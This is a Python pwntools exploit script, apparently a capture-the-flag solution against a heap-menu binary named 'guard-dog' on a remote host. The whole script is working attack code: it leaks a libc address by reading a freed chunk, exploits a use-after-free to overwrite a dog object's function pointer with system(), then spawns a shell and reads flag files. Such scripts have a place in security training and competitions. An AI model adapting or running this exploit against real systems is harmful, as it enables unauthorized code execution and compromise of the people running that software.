#!/usr/bin/env python3
from pwn import *

exe  = './guard-dog'
libc = ELF('./libc-2.31.so', checksec=False)

context.binary = exe
context.log_level = 'info'

LIBC_LEAK_OFFSET = 0x1ecbe0

io = remote('10.0.175.12', 1025)

def menu(choice):
    io.sendlineafter(b'7) go home', str(choice).encode())

def adopt(idx, name):
    menu(1)
    io.sendlineafter(b'kennel (0-7): ', str(idx).encode())
    io.recvuntil(b'name: ')
    io.send(name.ljust(0x18, b'\x00'))

def command(idx):
    menu(2)
    io.sendlineafter(b'kennel: ', str(idx).encode())

def release(idx):
    menu(3)
    io.sendlineafter(b'kennel: ', str(idx).encode())

def file_note(idx, size, contents):
    menu(4)
    io.sendlineafter(b'note slot (0-7): ', str(idx).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.recvuntil(b'contents: ')
    io.send(contents.ljust(size, b'\x00'))

def read_note(idx, size):
    menu(5)
    io.sendlineafter(b'note slot: ', str(idx).encode())
    io.recvuntil(b'contents: ')
    return io.recvn(size)

def shred_note(idx):
    menu(6)
    io.sendlineafter(b'note slot: ', str(idx).encode())

# ---------- Stage 1: libc leak ----------
file_note(0, 0x500, b'A' * 0x500)    # victim
file_note(1, 0x100, b'B' * 0x100)    # guard — prevents top consolidation
shred_note(0)

leak = read_note(0, 0x500)
fd = u64(leak[0:8])
bk = u64(leak[8:16])
log.info(f'fd = {hex(fd)}')
log.info(f'bk = {hex(bk)}')
log.info(f'fd & 0xfff = {hex(fd & 0xfff)}')

assert fd == bk and (fd & 0xfff) == 0xbe0, "leak failed"

libc.address = fd - LIBC_LEAK_OFFSET
system_addr = libc.symbols['system']
log.success(f'libc base = {hex(libc.address)}')
log.success(f'system    = {hex(system_addr)}')

# ---------- Stage 2: dog UAF -> fn ptr overwrite ----------
adopt(0, b'/bin/sh\x00')
release(0)

payload  = b'/bin/sh\x00'
payload += b'A' * 0x10
payload += p64(system_addr)
assert len(payload) == 0x20
file_note(2, 0x20, payload)

# ---------- Stage 3: trigger ----------
command(0)
io.sendline(b'echo SHELL; id; cat flag.txt /flag* flag* 2>/dev/null')
io.interactive()